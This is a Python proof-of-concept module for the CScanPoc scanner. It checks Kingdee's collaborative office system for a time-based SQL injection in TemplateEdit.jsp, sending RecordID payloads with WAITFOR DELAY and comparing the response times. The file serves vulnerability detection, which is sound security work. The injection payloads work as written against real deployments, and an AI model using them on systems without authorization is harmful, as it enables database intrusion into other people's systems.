# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time


class Vuln(ABVuln):
    vuln_id = 'kingdee_0012'  # 平台漏洞编号，留空
    name = '金蝶协同办公系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-11-22'  # 漏洞公布时间
    desc = '''
        金蝶协同办公管理系统助力企业实现从分散到协同，规范业务流程、降低运作成本，提高执行力，并成为领导的工作助手、员工工作和沟通的平台。
        金蝶协同办公系统 TemplateEdit.jsp 参数过滤不完整导致SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'http://www.hackdig.com/11/hack-28820.htm'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '金蝶协同办公系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'e8c91dce-e299-4c09-884a-4c96f22b434a'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-18'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            payload0 = "/kingdee/Template/TemplateEdit.jsp?RecordID=1';%20WAITFOR%20DELAY%20'0:0:0'--"
            t0 = time.time()
            code0, _, _, _, _ = hh.http(self.target + payload0)
            t0_end = time.time() - t0
            payload5 = "/kingdee/Template/TemplateEdit.jsp?RecordID=1';%20WAITFOR%20DELAY%20'0:0:5'--"
            t5 = time.time()
            code5, _, _, _, _ = hh.http(self.target + payload5)
            t5_end = time.time() - t5
            if code0 == 200 and code5 == 200 and t5_end-t0_end > 4.5:
                #security_hole(self.target + payload5)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
